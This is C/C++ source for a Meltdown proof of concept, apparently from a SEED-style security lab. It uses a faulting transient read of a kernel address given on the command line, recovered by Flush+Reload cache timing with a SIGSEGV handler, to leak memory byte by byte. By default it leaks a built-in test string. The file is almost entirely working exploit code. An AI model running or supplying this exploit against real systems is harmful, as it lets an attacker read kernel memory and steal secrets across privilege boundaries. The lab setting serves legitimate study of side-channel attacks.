#include <stdio.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>
#include <fcntl.h>
#include <x86intrin.h>
#include <unistd.h>
#include "../spectre/utils.hpp"

using namespace std;
using namespace x86_64;

uint8_t array[256 * 4096];
uint8_t hits[256] = {0};
#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024
#define FROM ' '
#define TO 'Z'

char secret[] = "AD ASTRA ABYSSOSQUE";

void flush_side_channel()
{
    // Write to array to bring it to RAM to prevent Copy-on-write
    for (int i = 0; i < 256; i++)
        array[i * 4096 + DELTA] = 1;

    // flush the values of the array from cache
    for (int i = 0; i < 256; i++)
        asm_utils::flush(&array[i * 4096 + DELTA]);

    for (int i = 0; i < 256; i++)
        hits[i] = 0;
}

uint64_t rdtscp()
{
    uint64_t a, d;
    asm volatile("rdtscp"
                 : "=a"(a), "=d"(d)::"rcx");
    a = (d << 32) | a;
    return a;
}

uint64_t rdtsc()
{
    uint64_t a, d;
    __asm__ volatile("rdtsc"
                     : "=a"(a), "=d"(d));
    a = (d << 32) | a;
    return a;
}

void maccess(void *p) { __asm__ volatile("movq (%0), %%rax\n"
                                         :
                                         : "c"(p)
                                         : "rax"); }

void reload_side_channel()
{
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    for (int i = 0; i < 256; i++)
    {
        addr = &array[i * 4096 + DELTA];
        time1 = asm_utils::rdtscp();
        asm_utils::maccess((void *)addr);
        time2 = asm_utils::rdtscp() - time1;
        if (time2 <= CACHE_HIT_THRESHOLD)
        {
            hits[i]++;
        }
    }
}

size_t show_hits(bool show = true)
{
    if (show)
    {
        // print the result
        for (size_t i = FROM; i < TO; i++)
        {
            printf("%lu ", i);
        }
        printf("\n");
        for (size_t i = FROM; i < TO; i++)
        {
            printf("%c ", (char)i);
        }
        printf("\n");
    }
    size_t max = 0;
    for (size_t i = FROM; i < TO; i++)
    {
        if (show)
        {
            printf("%d ", hits[i]);
        }
        if (hits[i] >= hits[max])
        {
            max = i;
        }
    }
    if (show)
    {
        printf("\n");
    }
    return max;
}

void meltdown(unsigned long kernel_data_addr)
{
    asm volatile(
        ".rept 400;"
        "add $0x141, %%eax;"
        ".endr;"
        :
        :
        : "eax");

    // The following statement will cause an exception
    char kernel_data = *(char *)0x0;
    kernel_data = *(char *)kernel_data_addr;
    array[kernel_data * 4096 + DELTA] += 1;
    printf("kernel_data = %d", kernel_data);
}

void meltdown_asm(unsigned long kernel_data_addr)
{
    char kernel_data = 0;
    // Give eax register something to do
    asm volatile(
        ".rept 400;"
        "add $0x141, %%eax;"
        ".endr;"
        :
        :
        : "eax");

    // The following statement will cause an exception
    kernel_data = *(char *)0x0;
    kernel_data = *(char *)kernel_data_addr;
    array[kernel_data * 4096 + DELTA] += 1;
    printf("kernel_data = %d", kernel_data);
}

// signal handler
static sigjmp_buf jbuf;
static void catch_segv(int signal)
{
    siglongjmp(jbuf, 1);
}

int main(int argc, char **argv)
{
    size_t target = (size_t)&secret, len = sizeof(secret);
    int fd;
    if (argc >= 2)
    {
        target = strtoull(argv[1], NULL, 0);
        fd = open("/proc/secret_data", O_RDONLY);
        if (argc >= 3)
        {
            len = strtoull(argv[2], NULL, 0);
        }
    }
    printf("Usage: %lx <kernel_data_addr>\n", target);
    // Register a signal handler
    signal(SIGSEGV, catch_segv);

    char leak[len + 1];
    for (size_t i = 0; i < len; i++)
    {
        for (int j = 0; j < 10; j++)
        {
            flush_side_channel();
            if (sigsetjmp(jbuf, 1) == 0)
            {
                if (argc >= 2)
                {
                    pread(fd, NULL, 0, 0);
                }
                meltdown_asm(target + i);
            }

            // RELOAD the probing array
            reload_side_channel();
        }

        size_t result = show_hits(false);
        leak[i] = (char)result;
        leak[i + 1] = '\0';
    }

    printf("leak: \n");
    for (size_t i = 0; i < len; i++)
    {
        printf("%c", (char)leak[i]);
    }
    printf("\n");
    return 0;
}
